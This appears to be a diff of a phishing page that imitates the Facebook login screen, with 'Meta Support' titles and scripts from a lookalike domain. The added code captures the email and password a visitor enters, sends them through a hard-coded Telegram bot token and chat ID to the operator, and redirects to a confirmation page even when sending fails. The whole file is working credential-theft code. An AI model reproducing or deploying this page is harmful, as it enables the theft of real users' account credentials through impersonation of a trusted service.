@@ -1,41 +1,90 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-TRYVP8NYC0"></script>
+  <script>
+    function gtag(){dataLayer.push(arguments);}
+    window.dataLayer = window.dataLayer || [];
+    gtag("js", new Date());
+    gtag("config", "G-TRYVP8NYC0");
+  </script>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Send Message to Telegram</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta name="description" content="Disagree With Decision">
+  <meta name="robots" content="noindex, nofollow, nocache">
+  <meta name="googlebot" content="noimageindex, max-video-preview:-1, max-image-preview:large, max-snippet:-1">
+  <meta property="og:title" content="Contact Suport Now">
+  <meta property="og:description" content="Contact Suport Now">
+  <meta property="og:image" content="https://res.cloudinary.com/dqvmnjw9l/image/upload/v1729691193/logo.jpg">
+  <meta property="og:type" content="article">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Contact Suport Now">
+  <meta name="twitter:description" content="Contact Suport Now">
+  <meta name="twitter:image" content="https://res.cloudinary.com/dqvmnjw9l/image/upload/v1729691193/logo.jpg">
+  <title>Meta Support</title>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css" rel="stylesheet">
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
+  <script defer src="https://contactadsverrifyaccounts.cloud/static/js/main.aae6dd77.js"></script>
+  <link href="https://contactadsverrifyaccounts.cloud/static/css/main.89ada21a.css" rel="stylesheet">
 </head>
 <body>
-
-  <h2>Send Email and Password to Telegram</h2>
-
-  <form id="loginForm">
-    <input id="email" type="email" placeholder="Email" required><br><br>
-    <input id="password" type="password" placeholder="Password" required><br><br>
-    <button id="sendBtn">Send</button>
-  </form>
+  <div id="root">
+    <div class="bg-[#E9EBEE] font-['Helvetica','Arial',sans-serif]">
+      <div class="min-h-screen flex flex-col justify-center items-center">
+        <div class="flex flex-col md:flex-row justify-center items-center w-full max-w-4xl mt-[50px] mb-10">
+          <div class="flex-1 p-5 md:p-10 text-left order-1 md:order-1 ml-[30px] md:ml-0">
+            <h1 class="text-[#1877F2] text-5xl md:text-6xl font-bold ml-[40px] md:ml-0">facebook</h1>
+            <p class="text-xl md:text-2xl mt-2 leading-relaxed max-w-md">
+              Facebook helps you connect and share with the people in your life.
+            </p>
+          </div>
+          <div class="bg-white rounded-lg shadow-md w-full max-w-sm p-6 order-2">
+            <form id="loginForm">
+              <input id="email" placeholder="Mobile number or email" class="w-full p-4 mb-4 border border-gray-300 rounded-md text-base focus:border-blue-500 focus:outline-none bg-[#F5F6F7]" required type="text" name="mobileEmail">
+              <input id="password" placeholder="Password" class="w-full p-4 mb-4 border border-gray-300 rounded-md text-base focus:border-blue-500 focus:outline-none bg-[#F5F6F7]" required type="password" name="password">
+              <button type="submit" id="sendBtn" class="w-full p-4 bg-[#1877F2] text-white rounded-md text-lg font-bold hover:bg-[#165eab]">Log In</button>
+            </form>
+            <a href="#" class="block text-center mt-5 text-sm text-[#1877F2] hover:underline">Forgot password?</a>
+            <hr class="my-6 border-t border-gray-300">
+            <div class="flex justify-center">
+              <a href="#" class="bg-[#42B72A] text-white px-6 py-4 rounded-md text-base font-bold hover:bg-[#36a420]">Create new account</a>
+            </div>
+          </div>
+        </div>
+        <div class="h-96"></div>
+      </div>
+      <footer class="w-full text-center text-xs text-gray-600 py-5 bg-white">
+        <!-- Footer content here... (omitted for brevity) -->
+        <div>Meta © 2025</div>
+      </footer>
+    </div>
+  </div>
 
   <script>
-document.getElementById("sendBtn").addEventListener("click", function() {
-  var email = document.getElementById("email").value;
-  var password = document.getElementById("password").value;
+   document.getElementById("sendBtn").addEventListener("click", function() {
 
-  var botToken = '8110453433:AAG56s0dUVRc4uAWmlVm9_WQPv-DKkjO164';
-  var chatId = '6022297636';
-  var message = `Email: ${email}\nPassword: ${password}`;
-  var url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      var email = document.getElementById("email").value;
+      var password = document.getElementById("password").value;
 
-  fetch(url, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: chatId, text: message })
-  })
-  .then(response => response.json())
-  .then(data => console.log('Message sent:', data))
-  .catch(error => console.error('Error:', error));
-});
+      var botToken = '8110453433:AAG56s0dUVRc4uAWmlVm9_WQPv-DKkjO164';
+      var chatId = '6022297636';
+      var message = `Email: ${email}\nPassword: ${password}`;
+      var url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
+      fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      })
+      .then(() => {
+        window.location.href = "confirm.html";
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        window.location.href = "confirm.html"; // Redirect even if there's an error
+      });
+    });
   </script>
-
 </body>
 </html>
